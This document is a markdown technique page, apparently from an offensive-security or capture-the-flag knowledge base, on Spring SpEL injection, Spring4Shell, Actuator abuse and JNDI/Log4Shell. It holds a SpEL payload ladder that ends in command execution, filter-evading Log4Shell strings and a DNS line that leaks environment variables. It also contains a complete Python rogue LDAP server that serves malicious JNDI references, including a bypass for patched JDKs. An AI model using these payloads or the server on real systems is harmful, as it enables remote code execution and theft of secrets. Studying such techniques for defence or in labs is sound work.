---
title: "Spring, SpEL and JNDI - Expression Injection, Actuator Abuse and Log4Shell"
category: web
subcategory: java
type: technique
tags: [spel, spel-injection, jndi, log4shell, log4j, spring4shell, spring-boot, actuator, thymeleaf, jndi-ldap, rmi, trusturlcodebase, beanfactory, spring-cloud-gateway, heapdump, jolokia, expression-language, marshalsec, burp, java]
difficulty: hard
summary: "Spring evaluates SpEL in more places than you think, and any JNDI lookup you influence (log4j, JdbcRowSetImpl, actuator) is a remote object factory."
when_to_use:
  - "Stack traces mention org.springframework, SpelEvaluationException or Thymeleaf"
  - "A parameter is echoed and #{7*7} or ${7*7} evaluates"
  - "/actuator, /env, /heapdump, /jolokia or /gateway/routes is reachable"
  - "Any user-controlled string reaches a log statement on a log4j2 2.x app"
  - "A DNS canary in a header fires long after the request (JNDI/lookup resolution)"
tools: [burp, marshalsec, curl, python3, jndi-exploit-kit, interactsh]
cves: [CVE-2021-44228, CVE-2021-45046, CVE-2021-45105, CVE-2022-22965, CVE-2022-22963, CVE-2022-22947, CVE-2018-1273]
related: [deser-java-ysoserial, deser-dotnet-viewstate, java-oauth-saml-flaws, jwt-attacks-full]
---

## TL;DR

Two Java-specific injection families keep showing up. **SpEL**: Spring's expression language
is evaluated in annotations, routing configs, Thymeleaf templates and framework internals;
`T(java.lang.Runtime)` reaches the whole JDK. **JNDI**: any lookup whose name you influence
(`${jndi:ldap://...}` in a logged string, a datasource URL, an actuator property) makes the
JVM fetch and instantiate an object *you* describe. Actuator endpoints hand you both, plus
credentials.

## Recognise it

- `#{7*7}` -> `49` = SpEL; `${7*7}` -> `49` = property placeholder or Thymeleaf; `*{}` =
  Thymeleaf selection; `__${...}__` = Thymeleaf preprocessing, evaluated before anything else
  and therefore the strongest primitive.
- Errors: `SpelEvaluationException`, `EL1008E: Property or field 'x' cannot be found`,
  `TemplateInputException`; `whitelabel error page`; `/actuator` returning a JSON `_links`
  map; `X-Application-Context`.
- Spring Boot banner in `/error`, `Server: Apache-Coyote`, `JSESSIONID`. Log4Shell shows
  nothing: probe with a per-host DNS canary and wait, since lookups often fire minutes later
  from a batch log processor rather than the front end.
- A response that renders a *fragment name* (`return "fragment :: " + name;`) is the
  Thymeleaf view-name SSTI sink.

## Theory

**Where SpEL gets evaluated.** `SpelExpressionParser().parseExpression(userInput).getValue()`
is the direct sink, but the interesting ones are indirect: `@Value("#{...}")` when the
property comes from user data; Spring Data `@Query` with SpEL parameters; Spring Security
`@PreAuthorize` strings; `spring.cloud.function.routing-expression` as an HTTP header
(CVE-2022-22963); Spring Data Commons property-path binding (CVE-2018-1273, `property[#{...}]`
in a POST body); Spring Cloud Gateway's Actuator route definitions (CVE-2022-22947, a
`filters[0].args.name` SpEL string that is evaluated on refresh). A `StandardEvaluationContext`
allows type references - `T(java.lang.Runtime).getRuntime()` - while a
`SimpleEvaluationContext` does not; CTF targets almost always use the former.

**Spring4Shell (CVE-2022-22965).** Spring's `WebDataBinder` binds request parameters onto
nested bean properties. On JDK 9+ a `class.module.classLoader...` path is reachable from
`getClass()`, so parameters can rewrite a Tomcat `AccessLogValve`'s directory, prefix, suffix
and pattern - turning the access log into an arbitrary file write inside the webapp. The
preconditions are strict: JDK 9+, Tomcat, deployed as a **WAR** (not an embedded jar),
`spring-webmvc`/`spring-webflux` below 5.3.18 / 5.2.20.

**Actuator.** Spring Boot's management endpoints are a toolbox: `/actuator/env` (GET leaks
config with `******` masking; POST *sets* properties when writable - e.g. a JNDI-backed
datasource URL - then `/actuator/refresh`), `/actuator/heapdump` (a full JVM heap: session
cookies, tokens, unmasked passwords), `/actuator/gateway/routes` (SpEL, CVE-2022-22947),
`/actuator/jolokia` (JMX over HTTP; the `createJNDIRealm`/MLet MBean routes to remote class
loading), `/actuator/mappings`, `/actuator/threaddump`, `/actuator/loggers` (switch on DEBUG
to surface secrets), `/actuator/logfile`.

**JNDI.** `InitialContext.lookup(name)` speaks LDAP, RMI, DNS, IIOP and CORBA. An LDAP entry
carrying `javaClassName` + `javaCodeBase` + `javaFactory` is a `Reference`: historically the
JVM downloaded the factory class from the codebase and ran its static initializer. Since JDK
6u211/7u201/8u191/11.0.1 `com.sun.jndi.ldap.object.trustURLCodebase` defaults to false, so
remote codebases are ignored - the pivot is then a **factory already on the classpath**:
`org.apache.naming.factory.BeanFactory` (Tomcat) driving `javax.el.ELProcessor.eval`,
`groovy.lang.GroovyClassLoader`, or c3p0. Those use `javaReferenceAddress` values of the
form `<index>#<type>#<content>`, with `forceString` choosing which setter runs.

**Log4Shell (CVE-2021-44228).** log4j2 expanded `${...}` lookups inside *message text*, so a
logged `${jndi:ldap://host/x}` performed a JNDI lookup. `${jndi:rmi://}`, `${jndi:dns://}`
(resolution only - perfect for blind detection) and `${jndi:ldaps://}` all work. Lookups
nest, defeating naive filters: `${${lower:j}ndi:}`, `${${::-j}${::-n}${::-d}${::-i}:}`,
`${jnd${upper:i}:}`. Non-JNDI lookups leak data even when JNDI is patched:
`${env:AWS_SECRET_ACCESS_KEY}`, `${sys:user.name}`, and `${jndi:dns://${env:USER}.canary}`
exfiltrates by DNS label. 2.15 restricted lookups to
localhost (CVE-2021-45046 bypassed it via a crafted Thread Context lookup), 2.16 removed
message lookups, 2.17 fixed the self-referential recursion DoS (CVE-2021-45105).

## Attack

**1. Confirm the expression language.** Send `#{7*7}`, `${7*7}`, `*{7*7}`, `__${7*7}__` in
every reflected parameter and header; whichever renders tells you which parser you are in.

**2. SpEL escalation ladder.**
```
#{7*7}                                        -> confirm evaluation
#{T(java.lang.System).getenv()}               -> environment, often the flag
#{new java.io.File('.').listFiles()}          -> directory listing without exec
#{T(org.springframework.util.StreamUtils).copyToString(new java.io.FileInputStream('/flag'),
  T(java.nio.charset.Charset).forName('UTF-8'))}
new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())
  .useDelimiter('\A').next()                  -> exec returns a Process; wrap it for stdout
```
Filter bypasses: build the class name by concatenation into `T(java.lang.Class).forName()`,
use `''.getClass().forName(..)`, or pivot through `#this`/`#root` when `T()` is blocked.

**3. Spring4Shell shape.** Bind `class.module.classLoader.resources.context.parent.pipeline
.first.*` properties (`directory`, `prefix`, `suffix`, `fileDateFormat`, `pattern`) so
Tomcat's access-log valve writes into the webapp directory, then reset the pattern. Only
viable in the WAR + JDK 9+ + Tomcat combination above.

**4. Actuator sweep.** `curl -s $T/actuator | jq`, then by value: `heapdump` (offline
`strings | grep -Ei 'password|secret|token'`), `env`, `mappings`, `gateway/routes`,
`jolokia/list`, `loggers`. Boot 1.x serves them unprefixed (`/env`, `/dump`, `/trace`).

**5. JNDI callback.** Point the target at your own LDAP/RMI server (the script below, or
`marshalsec.jndi.LDAPRefServer http://host:8000/#Exploit`). Old JDKs fetch the reference's
`javaCodeBase` over HTTP; on 8u191+ serve a `BeanFactory` reference instead. Always start
with `${jndi:dns://canary}` - DNS resolution proves the sink and is never blocked by
`trustURLCodebase`.

**6. Where to put the string.** `User-Agent`, `X-Forwarded-For`, `Referer`,
`Authorization`, usernames, filenames, HTTP verbs, `Content-Type`, SNI - anything logged.
Failed logins and 404 paths are the most commonly logged values.

## Code

```python
#!/usr/bin/env python3
"""Minimal JNDI/LDAP reference server - stdlib only, hand-rolled ASN.1 BER.

Answers a bindRequest with bindResponse(success) and any searchRequest with a
searchResEntry carrying a JNDI Reference (javaClassName / javaCodeBase /
javaFactory) plus searchResDone: what a JNDI lookup needs in order to follow a
codebase. Useful to *prove* a lab target resolves and follows your reference.

  python3 ldapref.py 0.0.0.0 1389 http://10.0.0.1:8000/ Exploit
  python3 ldapref.py --beanfactory 0.0.0.0 1389 '' Foo   # local-classpath mode
  python3 ldapref.py                                     # no args: self-test
"""
from __future__ import annotations

import socket
import socketserver
import sys
import threading

# --- ASN.1 BER, only what LDAP needs --------------------------------------
def ber_len(n: int) -> bytes:
    if n < 0x80:
        return bytes([n])
    b = n.to_bytes((n.bit_length() + 7) // 8, "big")
    return bytes([0x80 | len(b)]) + b


def tlv(tag: int, value: bytes) -> bytes:
    return bytes([tag]) + ber_len(len(value)) + value


def ber_int(n: int, tag: int = 0x02) -> bytes:
    return tlv(tag, b"\x00" if n == 0 else n.to_bytes(n.bit_length() // 8 + 1, "big"))


def ber_enum(n: int) -> bytes:               # ENUMERATED
    return ber_int(n, 0x0A)


def ber_bool(v: bool) -> bytes:
    return tlv(0x01, b"\xff" if v else b"\x00")


def ber_str(s: str | bytes) -> bytes:        # OCTET STRING
    return tlv(0x04, s.encode() if isinstance(s, str) else s)


def ber_seq(*p: bytes) -> bytes:
    return tlv(0x30, b"".join(p))


def ber_set(*p: bytes) -> bytes:
    return tlv(0x31, b"".join(p))


def ber_read(d: bytes, i: int = 0) -> tuple[int, bytes, int]:
    """-> (tag, content, next_index)"""
    tag = d[i]
    i += 1
    n = d[i]
    i += 1
    if n & 0x80:
        k = n & 0x7F
        n = int.from_bytes(d[i:i + k], "big")
        i += k
    return tag, d[i:i + n], i + n


# --- LDAP protocol ops (application tags) ---------------------------------
BIND_REQ, BIND_RES = 0x60, 0x61          # [APPLICATION 0] / [APPLICATION 1]
SEARCH_REQ, SEARCH_ENTRY, SEARCH_DONE = 0x63, 0x64, 0x65


def ldap_message(msgid: int, op: bytes) -> bytes:
    return ber_seq(ber_int(msgid), op)


def ldap_result(tag: int, code: int = 0, matched: str = "", msg: str = "") -> bytes:
    return tlv(tag, ber_enum(code) + ber_str(matched) + ber_str(msg))


def attribute(name: str, values: list[str]) -> bytes:
    return ber_seq(ber_str(name), ber_set(*[ber_str(v) for v in values]))


def jndi_reference(dn: str, class_name: str, codebase: str,
                   factory: str | None = None,
                   ref_addrs: list[str] | None = None) -> bytes:
    """searchResEntry whose attributes decode into a javax.naming.Reference."""
    attrs = [attribute("objectClass", ["top", "javaNamingReference"]),
             attribute("javaClassName", [class_name]),
             attribute("javaFactory", [factory or class_name])]
    if codebase:
        attrs.append(attribute("javaCodeBase", [codebase]))
    if ref_addrs:
        attrs.append(attribute("javaReferenceAddress", ref_addrs))
    return tlv(SEARCH_ENTRY, ber_str(dn) + ber_seq(*attrs))


def bean_factory_addrs(props: list[tuple[str, str]]) -> list[str]:
    """BeanFactory reference addresses: '<index>#<type>#<content>'. 'forceString'
    makes BeanFactory call setX(String) reflectively - the 8u191+ local-classpath
    pivot, since no remote codebase is fetched."""
    return ["%d#%s#%s" % (i, t, c) for i, (t, c) in enumerate(props)]


def build_bind_request(msgid: int = 1, dn: str = "", pw: str = "") -> bytes:
    body = ber_int(3) + ber_str(dn) + tlv(0x80, pw.encode())   # simple auth [0]
    return ldap_message(msgid, tlv(BIND_REQ, body))


def build_search_request(msgid: int = 2, base: str = "Exploit") -> bytes:
    body = (ber_str(base) + ber_enum(0) + ber_enum(0) + ber_int(0) + ber_int(0)
            + ber_bool(False) + tlv(0x87, b"objectClass") + ber_seq())
    return ldap_message(msgid, tlv(SEARCH_REQ, body))


# --- server ---------------------------------------------------------------
def recvn(sock: socket.socket, n: int) -> bytes:
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            break
        buf += chunk
    return buf


def recv_ldap(sock: socket.socket) -> bytes | None:
    hdr = recvn(sock, 2)
    if len(hdr) < 2:
        return None
    n = hdr[1]
    if n & 0x80:
        k = n & 0x7F
        ext = recvn(sock, k)
        return hdr + ext + recvn(sock, int.from_bytes(ext, "big"))
    return hdr + recvn(sock, n)


class LdapHandler(socketserver.BaseRequestHandler):
    def handle(self) -> None:
        cfg = self.server.cfg                      # type: ignore[attr-defined]
        while True:
            msg = recv_ldap(self.request)
            if not msg:
                return
            _, content, _ = ber_read(msg, 0)
            _, mid_raw, j = ber_read(content, 0)
            msgid = int.from_bytes(mid_raw, "big")
            optag, opval, _ = ber_read(content, j)
            if optag == BIND_REQ:
                self.request.sendall(
                    ldap_message(msgid, ldap_result(BIND_RES)))
            elif optag == SEARCH_REQ:
                _, dn_raw, _ = ber_read(opval, 0)
                dn = dn_raw.decode("utf-8", "replace")
                cfg["log"].append(("search", dn))
                self.request.sendall(
                    ldap_message(msgid, jndi_reference(
                        dn, cfg["class_name"], cfg["codebase"],
                        cfg["factory"], cfg["ref_addrs"]))
                    + ldap_message(msgid, ldap_result(SEARCH_DONE)))
            else:                            # unbind or anything else: hang up
                return


class LdapServer(socketserver.ThreadingTCPServer):
    allow_reuse_address, daemon_threads = True, True

    def __init__(self, addr, class_name="Exploit", codebase="http://127.0.0.1:8000/",
                 factory=None, ref_addrs=None):
        super().__init__(addr, LdapHandler)
        self.cfg = {"class_name": class_name, "codebase": codebase,
                    "factory": factory, "ref_addrs": ref_addrs, "log": []}


def _self_test() -> None:
    srv = LdapServer(("127.0.0.1", 0), "Exploit", "http://127.0.0.1:8000/")
    port = srv.server_address[1]
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    try:
        s = socket.create_connection(("127.0.0.1", port), timeout=5)
        s.sendall(build_bind_request(1))
        bind = recv_ldap(s)
        assert bind is not None and bind[0] == 0x30, bind   # 0x30 = SEQUENCE
        _, content, _ = ber_read(bind, 0)
        _, mid, j = ber_read(content, 0)
        optag, opval, _ = ber_read(content, j)
        assert int.from_bytes(mid, "big") == 1 and optag == BIND_RES
        assert ber_read(opval, 0)[1] == b"\x00", "resultCode must be success"
        s.sendall(build_search_request(2, "Exploit"))
        entry, done = recv_ldap(s), recv_ldap(s)
        assert entry is not None and entry[0] == 0x30      # LDAP message envelope
        assert b"http://127.0.0.1:8000/" in entry, entry    # the codebase URL
        assert b"javaCodeBase" in entry and b"javaClassName" in entry
        assert b"javaNamingReference" in entry and b"Exploit" in entry
        _, dcontent, _ = ber_read(done, 0)
        _, _, dj = ber_read(dcontent, 0)
        assert ber_read(dcontent, dj)[0] == SEARCH_DONE
        assert srv.cfg["log"] == [("search", "Exploit")], srv.cfg["log"]
        s.close()
    finally:
        srv.shutdown()
        srv.server_close()

    assert ber_read(ber_seq(ber_int(1)))[0] == 0x30      # BER round-trip sanity
    assert ber_len(200) == b"\x81\xc8" and ber_len(5) == b"\x05"
    addrs = bean_factory_addrs([("forceString", "x=eval"), ("x", "1+1")])
    assert addrs[0] == "0#forceString#x=eval", addrs
    ref = jndi_reference("a", "Foo", "", "org.apache.naming.factory.BeanFactory", addrs)
    assert b"javaReferenceAddress" in ref and b"forceString" in ref
    assert b"javaCodeBase" not in ref, "no codebase in local-classpath mode"
    print("[ok] ldap reference server self-test passed (port was %d)" % port)


def main(argv: list[str]) -> int:
    beans = "--beanfactory" in argv
    argv = [a for a in argv if a != "--beanfactory"] + ["0.0.0.0", "1389",
                                                        "http://127.0.0.1:8000/", "Exploit"]
    host, port, codebase, cls = argv[1], int(argv[2]), argv[3], argv[4]
    factory, addrs = None, None
    if beans:                                # JDK 8u191+ style: no remote codebase
        factory, codebase = "org.apache.naming.factory.BeanFactory", ""
        addrs = bean_factory_addrs([("forceString", "x=eval"), ("x", "1+1")])
    srv = LdapServer((host, port), cls, codebase, factory, addrs)
    print("[*] ldap://%s:%d/%s codebase=%s" % (host, port, cls,
                                               codebase or "<local classpath>"))
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        srv.server_close()
    return 0


if __name__ == "__main__":
    if len(sys.argv) == 1:
        _self_test()
    else:
        raise SystemExit(main(sys.argv))
```

## Variants & pitfalls

- **`${7*7}` renders but nothing else does**: that is a property placeholder, not SpEL - try
  `${environment}` / `${spring.datasource.password}` for config leakage instead.
- **Thymeleaf `__${...}__`** is preprocessed before expression restrictions apply, and a
  user-controlled view name or fragment selector (`~{...}`) is equally good.
- **`exec()` returns a Process**: without a `Scanner`/`StreamUtils` wrapper you see
  `java.lang.UNIXProcess@...` and assume it failed.
- **8u191+ is not a JNDI fix**, only a remote-codebase one; local factories still work.
- **log4j 1.x is not Log4Shell-vulnerable** but has its own JMSAppender issue (CVE-2021-4104).
- **Actuator POST to `/env`** needs a following `/actuator/refresh`, and Boot 2.x needs
  `management.endpoint.env.post.enabled`. Use one canary subdomain per injection point so a
  late DNS hit still identifies which parameter fired.

## Tools

- `marshalsec` - `marshalsec.jndi.LDAPRefServer` / `RMIRefServer` in one command.
- `JNDI-Exploit-Kit` / `JNDIExploit` - LDAP+HTTP+RMI in one process, with 8u191+ factories.
- Burp Collaborator or `interactsh` for DNS/LDAP canaries; `curl -s $T/actuator/heapdump
  -o h.hprof` then `strings`/VisualVM/`jhat`.

## References

- Apache Log4j 2 security advisories - CVE-2021-44228/45046/45105 timeline.
- Spring Security advisories - CVE-2022-22965, CVE-2022-22963, CVE-2022-22947.
- Michael Stepankin (PortSwigger) - "Exploiting JNDI Injections in Java"; Munoz & Mirosh -
  "A Journey from JNDI/LDAP Manipulation to RCE" (BlackHat 2016).
- PortSwigger Web Security Academy - SSTI and Spring Boot Actuator labs.
